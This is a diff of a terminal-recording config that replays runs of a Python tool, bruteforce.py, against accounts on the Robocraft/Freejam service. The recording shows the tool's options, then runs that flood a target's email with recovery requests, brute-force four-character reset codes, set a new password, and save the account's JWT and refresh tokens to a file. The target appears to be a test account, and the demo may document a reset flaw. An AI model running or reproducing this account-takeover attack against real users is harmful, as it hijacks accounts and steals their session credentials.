@@ -9,7 +9,7 @@ config:
   
   # Specify the current working directory path
   # the default is the current working directory path
-  cwd: null
+  cwd: C:\Dev\Projects\robocraft-changer
   
   # Export additional ENV variables
   env:
@@ -18,12 +18,12 @@ config:
   # Explicitly set the number of columns
   # or use `auto` to take the current
   # number of columns of your shell
-  cols: 123
+  cols: 100
   
   # Explicitly set the number of rows
   # or use `auto` to take the current
   # number of rows of your shell
-  rows: 32
+  rows: 31
   
   # Amount of times to repeat GIF
   # If value is -1, play once
@@ -71,12 +71,12 @@ config:
   
   # Cursor style can be one of
   # `block`, `underline`, or `bar`
-  cursorStyle: underline
+  cursorStyle: block
   
   # Font family
   # You can use any font that is installed on your machine
   # in CSS-like syntax
-  fontFamily: "Monaco, Lucida Console, Ubuntu Mono, Monospace"
+  fontFamily: "CaskaydiaCove NF"
   
   # The size of the font
   fontSize: 12
@@ -111,153 +111,184 @@ config:
   
 # Records, feel free to edit them
 records:
-  - delay: 60
+  - delay: 1186
     content: "\e[2J\e[m\e[H\e]0;C:\\Program Files\\PowerShell\\7-preview\\pwsh.exe\a\e[?25h"
-  - delay: 60
-    content: "\e[1m\e[96m\r\nrobocraft-changer\e[m via \e[1m\e[93m\U0001F40D v3.9.6 \e[92m\r\n❯\e[m \e[43X"
-  - delay: 60
+  - delay: 578
+    content: "\e[1m\e[96m\r\nrobocraft-changer\e[m on \e[1m\e[95m master\e[m \e[1m\e[91m[!?⇡]\e[m via \e[1m\e[93m\U0001F40D v3.9.6 \e[92m\r\n❯\e[m \e[48X"
+  - delay: 6441
     content: "\e[?25l"
-  - delay: 60
+  - delay: 8
     content: "\e[93mp\e[?25h"
-  - delay: 60
-    content: "\e[m\e[?25l"
-  - delay: 60
-    content: "\e[93m\bpy\e[?25h"
-  - delay: 60
-    content: "\e[m\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpyt\e[?25h"
-  - delay: 60
-    content: "\e[m\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpyth\e[?25h"
-  - delay: 60
-    content: "\e[m\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpytho\e[?25h"
-  - delay: 60
-    content: "\e[m\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[?25h"
-  - delay: 60
-    content: "\e[m\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[m \e[?25h"
-  - delay: 60
-    content: "\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[m b\e[?25h"
-  - delay: 60
-    content: "\e[25l\e[93m\e[3;3Hpython\e[m br\e[?25h"
-  - delay: 60
-    content: "\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[m bru\e[?25h"
-  - delay: 60
-    content: "\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[m brut\e[?25h"
-  - delay: 60
-    content: "\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[m brute\e[?25h"
-  - delay: 60
-    content: "\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[m brutef\e[?25h"
-  - delay: 60
-    content: "\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[m brutefo\e[?25h"
-  - delay: 60
-    content: "\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[m brutefor\e[?25h"
-  - delay: 60
-    content: "\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[m bruteforc\e[?25h"
-  - delay: 60
-    content: "\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[m bruteforce\e[?25h"
-  - delay: 60
-    content: "\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[m bruteforce.\e[?25h"
-  - delay: 60
-    content: "\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[m bruteforce.p\e[?25h"
-  - delay: 60
-    content: "\e[?25l"
-  - delay: 60
-    content: "\e[93m\e[3;3Hpython\e[m bruteforce.py\e[?25h"
-  - delay: 60
+  - delay: 16
+    content: "\e[m\e[93m\bpython\e[m bruteforce.py \e[90m--help"
+  - delay: 563
+    content: "\e[m"
+  - delay: 19
     content: "\r\n"
-  - delay: 60
-    content: '  0%|                                                                                         | 0/1679616 [00:00<?, ?it/s]'
-  - delay: 60
-    content: "\e[32m\r2022-04-06 23:20:27.954\e[m | \e[97mINFO    \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m65\e[m - \e[97mStarting takeover for MyTestAccount\e[m\e[K\r\n  0%|                                                                                         | 0/1679616 [00:00<?, ?it/s]"
-  - delay: 60
-    content: "\r\e[K\e[122C"
-  - delay: 60
-    content: "\e[32m\r2022-04-06 23:20:31.078\e[m | \e[97mINFO    \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m70\e[m - \e[97mSent 100 recovery emails\e[m\e[K\e[32m\r\n2022-04-06 23:20:31.080\e[m | \e[97mINFO    \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m74\e[m - \e[97mStarting bruteforce\e[m\e[K\r\nAAAA:   0%|                                                                      | 1/1679616 [00:03<1460:50:48,  3.13s/it]"
-  - delay: 90
-    content: "\rAAAZ:   0%|                                                                       | 26/1679616 [00:03<41:45:46, 11.17it/s]"
-  - delay: 90
-    content: "\rAABD:   0%|                                                                       | 40/1679616 [00:03<24:58:36, 18.68it/s]"
-  - delay: 90
-    content: "\rAAB9:   0%|                                                                       | 72/1679616 [00:03<11:27:18, 40.73it/s]"
-  - delay: 90
-    content: "\rAAC7:   0%|                                                                       | 106/1679616 [00:03<6:42:56, 69.47it/s]"
-  - delay: 90
-    content: "\rAADW:   0%|                                                                       | 131/1679616 [00:03<5:06:38, 91.28it/s]"
-  - delay: 90
-    content: "\rAAEU:   0%|                                                                      | 165/1679616 [00:03<3:40:05, 127.18it/s]"
-  - delay: 90
-    content: "\rAAFP:   0%|                                                                      | 196/1679616 [00:03<3:02:31, 153.34it/s]"
-  - delay: 90
-    content: "\rAAGW:   0%|                                                                      | 239/1679616 [00:04<2:19:31, 200.62it/s]"
-  - delay: 90
-    content: "\rAAHQ:   0%|                                                                      | 269/1679616 [00:04<2:17:23, 203.71it/s]"
-  - delay: 90
-    content: "\rAAIR:   0%|                                                                      | 306/1679616 [00:04<2:00:37, 232.02it/s]"
-  - delay: 90
-    content: "\rAAJK:   0%|                                                                      | 335/1679616 [00:04<1:59:48, 233.61it/s]"
-  - delay: 60
-    content: "\rAAKD:   0%|                                                                      | 364/1679616 [00:04<1:53:18, 246.99it/s]"
-  - delay: 90
-    content: "\rAALF:   0%|                                                                      | 402/1679616 [00:04<1:41:21, 276.10it/s]"
-  - delay: 90
-    content: "\rAAMA:   0%|                                                                      | 433/1679616 [00:04<1:45:09, 266.15it/s]"
-  - delay: 90
-    content: "\rAAM3:   0%|                                                                      | 462/1679616 [00:04<1:46:32, 262.66it/s]"
-  - delay: 90
-    content: "\rAAN0:   0%|                                                                      | 495/1679616 [00:04<1:42:21, 273.41it/s]"
-  - delay: 90
-    content: "\rAAOV:   0%|                                                                      | 526/1679616 [00:05<1:39:05, 282.41it/s]"
-  - delay: 90
-    content: "\rAAPV:   0%|                                                                      | 562/1679616 [00:05<1:34:26, 296.32it/s]"
-  - delay: 90
-    content: "\rAAQQ:   0%|                                                                      | 593/1679616 [00:05<1:43:13, 271.09it/s]"
-  - delay: 90
-    content: "\rAARM:   0%|                                                                      | 625/1679616 [00:05<1:38:33, 283.91it/s]"
-  - delay: 90
-    content: "\rAASG:   0%|                                                                      | 655/1679616 [00:05<1:48:00, 259.07it/s]"
-  - delay: 90
-    content: "\rAATK:   0%|                                                                      | 695/1679616 [00:05<1:38:16, 284.74it/s]"
-  - delay: 90
-    content: "\rAAUE:   0%|                                                                      | 725/1679616 [00:05<1:40:46, 277.65it/s]"
-  - delay: 90
-    content: "\r\e[K\e[122C"
-  - delay: 600
-    content: "\e[32m\r2022-04-06 23:20:33.827\e[m | \e[97mINFO    \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m85\e[m - \e[97mFound code: AATC\e[m\e[K\e[32m\r\n2022-04-06 23:20:33.829\e[m | \e[97mINFO    \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m97\e[m - \e[97mDone\e[m\e[K\e[32m\r\n2022-04-06 23:20:33.830\e[m | \e[92mSUCCESS \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m98\e[m - \e[92mSuccess code is AATC. Password is now XDLiyLE7mdiRj!, closing\e[m     \r\nAAVC:   0%|                                                                      | 759/1679616 [00:05<1:40:46, 277.65it/s]"
-  - delay: 600
-    content: "\rAAVC:   0%|                                                                       | 759/1679616 [00:10<6:41:42, 69.66it/s]"
-  - delay: 600
+  - delay: 344
+    content: "usage: bruteforce.py [-h] -e -i [-p] [-b] [-c] [-r] [-a] [-s] [-sp]\e[28X\r\n\e[95X\r\noptional arguments:\e[76X\r\n  -h, --help            show this help message and exit\e[40X\r\n  -e, --email       The email of the target account (default: None)\e[28X\r\n  -i, --account_id  The account id of the target account (default: None)\e[23X\r\n  -p, --new_password\e[75X\r\n                        The new password to set (default: XDLiyLE7mdiRj!)\e[22X\r\n  -b, --max_concurrent_brute_requests\e[58X\r\n                        The maximum number of concurrent requests to make when bruteforcing    \r\n                        (default: 20)\e[58X\r\n  -c, --max_concurrent_email_requests\e[58X\r\n                        The maximum number of concurrent requests to make when sending recovery\r\n                        emails (default: 5)\e[52X\r\n  -r, --password_reset_emails\e[66X\r\n                        The number of emails to send to reset the password, higher number ->   \r\n                        higher speed (default: 100)\e[44X\r\n  -a, --additional_account_info\e[64X\r\n                        Get additional account info (default: False)\e[27X\r\n  -s, --save            Save the account info to a file (default: False)\e[23X\r\n  -sp, --save_path  The path to save the account info to (default: account_info.json)\e[10X\r\n"
+  - delay: 255
+    content: "\e[1m\e[96m\r\nrobocraft-changer\e[m on \e[1m\e[95m master\e[m \e[1m\e[91m[!?⇡]\e[m via \e[1m\e[93m\U0001F40D v3.9.6 \e[92m\r\n❯\e[m \e[48X"
+  - delay: 4976
+    content: "\e[?25l"
+  - delay: 20
+    content: "\e[93mpython\e[m bruteforce.py \e[90m--email\e[m testuser@gmail.com \e[90m--account_id\e[m f392fdc5-1cc2-4847-8e4b-2f6cd4c"
+  - delay: 15
+    content: "\e[93m\e[27;3Hpython\e[m bruteforce.py \e[90m--email\e[m testuser@gmail.com \e[90m--account_id\e[m f392fdc5-1cc2-4847-8e4b-2f6cd4c2c5d4\e[?25h"
+  - delay: 945
     content: "\r\n"
-  - delay: 600
-    content: "\e[1m\e[96m\r\nrobocraft-changer\e[m via \e[1m\e[93m\U0001F40D v3.9.6 \e[mtook \e[1m\e[93m11s\e[m \e[1m\e[92m\r\n❯\e[m \e[52X"
-  - delay: 3000
+  - delay: 356
+    content: '  0%|                                                                  | 0/1679616 [00:00<?, ?it/s]'
+  - delay: 9
+    content: "\e[32m\r2022-04-07 14:50:28.891\e[m | \e[97mINFO    \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m76\e[m - \e[97mStarting takeover for testuser@gmail.com\e[m   \r\n  0%|                                                                  | 0/1679616 [00:00<?, ?it/s]"
+  - delay: 2931
+    content: "\r\e[K\e[99C\e[32m\r2022-04-07 14:50:31.829\e[m | \e[97mINFO    \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m78\e[m - \e[97mSent 100 recovery emails to testuser@gmail.c\r\nom\e[m\e[K\e[32m\r\n2022-04-07 14:50:31.830\e[m | \e[97mINFO    \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m79\e[m - \e[97mStarting bruteforce\e[m\e[K\r"
+  - delay: 18
+    content: "\n  0%|                                                                  | 0/1679616 [00:02<?, ?it/s] \b"
+  - delay: 29
+    content: "\rAAAT:   0%|                                               | 1/1679616 [00:02<1394:50:30,  2.99s/it]"
+  - delay: 103
+    content: "\rAAA3:   0%|                                                | 11/1679616 [00:03<95:44:29,  4.87it/s]"
+  - delay: 101
+    content: "\rAACH:   0%|                                                | 61/1679616 [00:03<13:17:05, 35.12it/s]"
+  - delay: 100
+    content: "\rAADO:   0%|                                                | 104/1679616 [00:03<6:59:08, 66.78it/s]"
+  - delay: 101
+    content: "\rAAEY:   0%|                                               | 150/1679616 [00:03<4:21:22, 107.09it/s]"
+  - delay: 104
+    content: "\rAAF6:   0%|                                               | 194/1679616 [00:03<3:07:57, 148.92it/s]"
+  - delay: 111
+    content: "\rAAG9:   0%|                                               | 233/1679616 [00:03<2:33:01, 182.90it/s]"
+  - delay: 101
+    content: "\rAAIH:   0%|                                               | 277/1679616 [00:03<2:02:37, 228.26it/s]"
+  - delay: 105
+    content: "\rAAJH:   0%|                                               | 317/1679616 [00:03<1:47:25, 260.53it/s]"
+  - delay: 112
+    content: "\rAAKP:   0%|                                               | 357/1679616 [00:03<1:38:35, 283.89it/s]"
+  - delay: 101
+    content: "\rAALY:   0%|                                               | 402/1679616 [00:04<1:26:48, 322.43it/s]"
+  - delay: 101
+    content: "\rAANB:   0%|                                               | 451/1679616 [00:04<1:16:57, 363.66it/s]"
+  - delay: 107
+    content: "\rAAOH:   0%|                                               | 494/1679616 [00:04<1:14:47, 374.20it/s]"
+  - delay: 102
+    content: "\rAAPO:   0%|                                               | 536/1679616 [00:04<1:12:47, 384.42it/s]"
+  - delay: 105
+    content: "\rAAQ2:   0%|                                               | 586/1679616 [00:04<1:08:08, 410.71it/s]"
+  - delay: 100
+    content: "\rAASB:   0%|                                               | 631/1679616 [00:04<1:06:27, 421.01it/s]"
+  - delay: 101
+    content: "\rAATL:   0%|                                               | 677/1679616 [00:04<1:04:53, 431.18it/s]"
+  - delay: 121
+    content: "\rAAUU:   0%|                                               | 722/1679616 [00:04<1:07:58, 411.67it/s]"
+  - delay: 74
+    content: "\rAAVO:   0%|                                               | 751/1679616 [00:04<3:00:18, 155.18it/s]\r\e[92m\n\e[32m2022-04-07 14:50:33.729\e[m | \e[92mSUCCESS \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m102\e[m - \e[92mSuccess code is AATX. Password is now XDLiy\b\e[m\r\n\e[92mLE7mdiRj!\r"
+  - delay: 14
+    content: "\e[m\n"
+  - delay: 245
+    content: "\n\e[1m\e[96mrobocraft-changer\e[m on \e[1m\e[95m master\e[m \e[1m\e[91m[!?⇡]\e[m via \e[1m\e[93m\U0001F40D v3.9.6 \e[mtook \e[1m\e[93m5s\e[m \e[K\r\n\e[1m\e[92m❯\e[m\e[K\e[1C"
+  - delay: 1829
+    content: "\e[?25l"
+  - delay: 17
+    content: "\e[93mpython\e[m bruteforce.py \e[90m--email\e[m testuser@gmail.com \e[90m--account_id\e[m f392fdc5-1cc2-4847-8e4b-2f6cd4c2c5d4 "
+  - delay: 6
+    content: "\r\n\e[1m\e[92m\e[30;1H❯\e[m \e[93mpython\e[m bruteforce.py \e[90m--email\e[m testuser@gmail.com \e[90m--account_id\e[m f392fdc5-1cc2-4847-8e4b-2f6cd4c2c5d4 \e[90m\r\n-a\e[m \e[90m-r\e[m \e[97m9\e[m\e[K\e[93C"
+  - delay: 16
+    content: "\e[1m\e[92m\e[30;1H❯\e[m \e[93mpython\e[m bruteforce.py \e[90m--email\e[m testuser@gmail.com \e[90m--account_id\e[m f392fdc5-1cc2-4847-8e4b-2f6cd4c2c5d4 \e[90m\r\n-a\e[m \e[90m-r\e[m \e[97m9\e[m \e[90m-s\e[m\e[K\e[?25h"
+  - delay: 625
     content: "\r\n"
+  - delay: 359
+    content: "  0%|                                                                  | 0/1679616 [00:00<?, ?it/s]\e[32m\r2022-04-07 14:50:36.843\e[m | \e[97mINFO    \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m76\e[m - \e[97mStarting takeover for testuser@gmail.com\e[m   \r"
+  - delay: 9
+    content: "\n  0%|                                                                  | 0/1679616 [00:00<?, ?it/s] \b"
+  - delay: 384
+    content: "\r\e[K\e[99C\e[32m\r2022-04-07 14:50:37.237\e[m | \e[97mINFO    \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m78\e[m - \e[97mSent 9 recovery emails to testuser@gmail.com\r\e[m\n\e[32m2022-04-07 14:50:37.239\e[m | \e[97mINFO    \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m79\e[m - \e[97mStarting bruteforce\e[m\e[K\r"
+  - delay: 5
+    content: "\n  0%|                                                                  | 0/1679616 [00:00<?, ?it/s] \b"
+  - delay: 42
+    content: "\rAAAT:   0%|                                                | 1/1679616 [00:00<208:13:10,  2.24it/s]"
+  - delay: 108
+    content: "\rAAA4:   0%|                                                | 12/1679616 [00:00<16:45:51, 27.83it/s]"
+  - delay: 102
+    content: "\rAACD:   0%|                                                | 57/1679616 [00:00<3:28:22, 134.34it/s]"
+  - delay: 100
+    content: "\rAADK:   0%|                                               | 100/1679616 [00:00<2:11:47, 212.40it/s]"
+  - delay: 102
+    content: "\rAAES:   0%|                                               | 144/1679616 [00:00<1:42:23, 273.36it/s]"
+  - delay: 104
+    content: "\rAAF3:   0%|                                               | 191/1679616 [00:00<1:25:58, 325.56it/s]"
+  - delay: 100
+    content: "\rAAHD:   0%|                                               | 237/1679616 [00:01<1:17:06, 362.98it/s]"
+  - delay: 109
+    content: "\rAAIJ:   0%|                                               | 279/1679616 [00:01<1:15:40, 369.83it/s]"
+  - delay: 101
+    content: "\rAAJR:   0%|                                               | 323/1679616 [00:01<1:11:53, 389.33it/s]"
+  - delay: 101
+    content: "\rAAKX:   0%|                                               | 365/1679616 [00:01<1:10:20, 397.92it/s]"
+  - delay: 109
+    content: "\rAAL3:   0%|                                               | 407/1679616 [00:01<1:11:14, 392.88it/s]"
+  - delay: 103
+    content: "\rAAM9:   0%|                                               | 449/1679616 [00:01<1:10:26, 397.28it/s]"
+  - delay: 101
+    content: "\rAAOF:   0%|                                               | 491/1679616 [00:01<1:09:36, 402.01it/s]"
+  - delay: 105
+    content: "\rAAPP:   0%|                                               | 537/1679616 [00:01<1:07:41, 413.41it/s]"
+  - delay: 104
+    content: "\rAAQ3:   0%|                                               | 587/1679616 [00:01<1:04:32, 433.61it/s]"
+  - delay: 100
+    content: "\rAASD:   0%|                                               | 633/1679616 [00:01<1:03:26, 441.10it/s]"
+  - delay: 105
+    content: "\rAATM:   0%|                                               | 678/1679616 [00:02<1:03:49, 438.43it/s]"
+  - delay: 106
+    content: "\rAAU1:   0%|                                               | 729/1679616 [00:02<1:02:09, 450.18it/s]"
+  - delay: 103
+    content: "\rAAWF:   0%|                                               | 779/1679616 [00:02<1:00:40, 461.13it/s]"
+  - delay: 101
+    content: "\rAAXP:   0%|                                               | 826/1679616 [00:02<1:00:33, 462.03it/s]"
+  - delay: 121
+    content: "\rAAY1:   0%|                                               | 873/1679616 [00:02<1:03:49, 438.39it/s]"
+  - delay: 115
+    content: "\rAA0A:   0%|                                               | 918/1679616 [00:02<1:06:13, 422.51it/s]"
+  - delay: 103
+    content: "\rAA1L:   0%|                                               | 965/1679616 [00:02<1:04:43, 432.30it/s]"
+  - delay: 115
+    content: "\rAA2T:   0%|                                              | 1009/1679616 [00:02<1:07:03, 417.24it/s]"
+  - delay: 117
+    content: "\rAA3Y:   0%|                                              | 1051/1679616 [00:02<1:10:06, 399.01it/s]"
+  - delay: 103
+    content: "\rAA44:   0%|                                              | 1092/1679616 [00:03<1:10:09, 398.73it/s]"
+  - delay: 101
+    content: "\rAA6I:   0%|                                              | 1142/1679616 [00:03<1:05:39, 426.03it/s]"
+  - delay: 100
+    content: "\rAA7Z:   0%|                                              | 1195/1679616 [00:03<1:01:22, 455.78it/s]"
+  - delay: 122
+    content: "\rAA89:   0%|                                              | 1241/1679616 [00:03<1:05:07, 429.58it/s]"
+  - delay: 12
+    content: "\rAA9G:   0%|                                              | 1247/1679616 [00:03<1:16:42, 364.69it/s]\r\e[92m\n\e[32m2022-04-07 14:50:40.260\e[m | \e[92mSUCCESS \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m102\e[m - \e[92mSuccess code is AA7K. Password is now XDLiy\b\e[m\r\n\e[92mLE7mdiRj!\r\e[m\n\e[32m2022-04-07 14:50:40.261\e[m | \e[97mINFO    \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m106\e[m - \e[97mGetting additional account info\e[m\e[K\r\n"
+  - delay: 218
+    content: "\e[32m2022-04-07 14:50:40.484\e[92m\e[m | \e[92mSUCCESS \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m109\e[m - \e[92mSuccessfully got additional account info, u\b\e[m\r\n\e[92msername is scorpowo\r\e[m\n\e[32m2022-04-07 14:50:40.486\e[m | \e[97mINFO    \e[m | \e[36m__main__\e[m:\e[36mmain\e[m:\e[36m135\e[m - \e[97mSaved account to account_info.json\e[m\e[K\r"
+  - delay: 13
+    content: |+
+
+  - delay: 232
+    content: "\n\e[1m\e[96mrobocraft-changer\e[m on \e[1m\e[95m master\e[m \e[1m\e[91m[!?⇡]\e[m via \e[1m\e[93m\U0001F40D v3.9.6 \e[mtook \e[1m\e[93m4s\e[m \e[K\r\n\e[1m\e[92m❯\e[m\e[K\e[1C"
+  - delay: 1818
+    content: "\e[?25l"
+  - delay: 9
+    content: "\e[93mcat\e[m account_info.json | \e[93mjq\e[m "
+  - delay: 15
+    content: "\e[93m\e[31;3Hcat\e[m account_info.json | \e[93mjq\e[m \e[90m-C\e[?25h"
+  - delay: 573
+    content: "\e[m"
+  - delay: 19
+    content: "\r\n"
+  - delay: 109
+    content: "\e[1m\e[97m[\r\n  {\r\n    \e[94m\"success\"\e[97m: \e[mtrue\e[1m\e[97m,\e[K\r\n    \e[94m\"email\"\e[97m: \e[22m\e[32m\"testuser@gmail.com\"\e[1m\e[97m,\e[K\r\n    \e[94m\"account_id\"\e[97m: \e[22m\e[32m\"f392fdc5-1cc2-4847-8e4b-2f6cd4c2c5d4\"\e[1m\e[97m,\e[K\r\n    \e[94m\"new_password\"\e[97m: \e[22m\e[32m\"XDLiyLE7mdiRj!\"\e[1m\e[97m,\e[K\r\n    \e[94m\"success_code\"\e[97m: \e[22m\e[32m\"AA7K\"\e[1m\e[97m,\e[K\r\n    \e[94m\"additional_account_info\"\e[97m: {\e[K\e[22m\e[32m\r\n\e[1m\e[97m      \e[94m\"Token\"\e[97m: \e[22m\e[32m\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJQdWJsaWNJZCI6ImYzOTJmZGM1LTFjYzItNDg0Ny04ZTR\b\r\niLTJmNmNkNGMyYzVkNCIsIkRpc3BsYXlOYW1lIjoic2NvcnBvd28iLCJSb2JvY3JhZnROYW1lIjoiZjM5MmZkYzUtMWNjMi00ODQ\b\r\n3LThlNGItMmY2Y2Q0YzJjNWQ0IiwiQ29uZmlybWVkIjp0cnVlLCJTdXBwb3J0Q29kZSI6IjIwMjZjMzc1YWQyMDQ5MWU4MmY0Yjc\b\r\n1M2NjYzBiM2EyIiwiRW1haWxBZGRyZXNzIjoidGVzdHVzZXJAZ21haWwuY29tIiwiRW1haWxWZXJpZmllZCI6ZmFsc2UsIkNyZWF\b\r\n0ZWREYXRlIjoiMjAyMi0wNC0wNlQwOTowNTowMSIsIlByb2R1Y3RzIjpbXSwiRmxhZ3MiOlsicmNfZGVmYXVsdGdhcmFnZXNjcmV\b\r\nhdGVkIiwicmNfdHV0b3JpYWxfZ2FyYWdlX2NyZWF0ZWQiXSwiSGFzUGFzc3dvcmQiOnRydWUsIk1haWxpbmdMaXN0cyI6W10sIkh\b\r\nhc1N0ZWFtIjpmYWxzZSwiaXNzIjoiRnJlZWphbSIsInN1YiI6IldlYiIsImlhdCI6MTY0OTMzNTg0MiwiZXhwIjoxNjQ5MzM1OTA\b\r\nyfQ.pk-NxxwFW_La564roxRLp28fVYxy\e[1m\e[97m\e[22m\e[32mkhFhSbd-NGiMoJk\"\e[1m\e[97m,\r\n      \e[94m\"RefreshToken\"\e[97m: \e[22m\e[32m\"8611b470187b46fb912add09c14bc8c9\"\e[1m\e[97m,\e[K\r\n      \e[94m\"RefreshTokenExpiry\"\e[97m: \e[22m\e[32m\"2022-05-07T12:50:41.7312483Z\"\e[1m\e[97m\e[K\r\n    },\r\n    \e[94m\"jwt_decoded\"\e[97m: {\e[K\r\n      \e[94m\"PublicId\"\e[97m: \e[22m\e[32m\"f392fdc5-1cc2-4847-8e4b-2f6cd4c2c5d4\"\e[1m\e[97m,\e[K\r\n      \e[94m\"DisplayName\"\e[97m: \e[22m\e[32m\"scorpowo\"\e[1m\e[97m,\e[K\r\n      \e[94m\"RobocraftName\"\e[97m: \e[22m\e[32m\"f392fdc5-1cc2-4847-8e4b-2f6cd4c2c5d4\"\e[1m\e[97m,\e[K\r\n      \e[94m\"Confirmed\"\e[97m: \e[mtrue\e[1m\e[97m,\e[K\e[22m\e[32m\r\n\e[1m\e[97m      \e[94m\"SupportCode\"\e[97m: \e[22m\e[32m\"2026c375ad20491e82f4b753c\e[1m\e[97m\e[K\e[22m\e[32mcc0b3a2\"\e[1m\e[97m,\r\n      \e[94m\"EmailAddress\"\e[97m: \e[22m\e[32m\"testuser@gmail.com\"\e[1m\e[97m,\e[K\r\n      \e[94m\"EmailVerified\"\e[97m: \e[mfalse\e[1m\e[97m,\e[K\r\n      \e[94m\"CreatedDate\"\e[97m: \e[22m\e[32m\"2022-04-06T09:05:01\"\e[1m\e[97m,\e[K\r\n      \e[94m\"Products\"\e[97m: [],\e[K\r\n      \e[94m\"Flags\"\e[97m: [\e[K\r\n        \e[22m\e[32m\"rc_defaultgaragescreated\"\e[1m\e[97m,\e[K\r\n        \e[22m\e[32m\"rc_tutorial_garage_created\"\e[1m\e[97m\e[K\r\n      ],\r\n      \e[94m\"HasPassword\"\e[97m: \e[mtrue\e[1m\e[97m,\e[K\r\n      \e[94m\"MailingLists\"\e[97m: [],\e[K\r\n      \e[94m\"HasSteam\"\e[97m: \e[mfalse\e[1m\e[97m,\e[K\r\n      \e[94m\"iss\"\e[97m: \e[22m\e[32m\"Freejam\"\e[1m\e[97m,\e[K\r\n      \e[94m\"sub\"\e[97m: \e[22m\e[32m\"Web\"\e[1m\e[97m,\e[K\r\n      \e[94m\"iat\"\e[97m: \e[m1649335842\e[1m\e[97m,\e[K\r\n      \e[94m\"exp\"\e[97m: \e[m1649335902\e[1m\e[97m\r\n    }\r\n  }\e[m\r\n\e[1m\e[97m]"
+  - delay: 13
+    content: "\e[m\r\n"
+  - delay: 217
+    content: "\n\e[1m\e[96mrobocraft-changer\e[m on \e[1m\e[95m master\e[m \e[1m\e[91m[!?⇡]\e[m via \e[1m\e[93m\U0001F40D v3.9.6 \e[m\e[K\r\n\e[1m\e[92m❯\e[m\e[K\e[1C"
+  - delay: 1902
+    content: "\e[?25l"
+
+
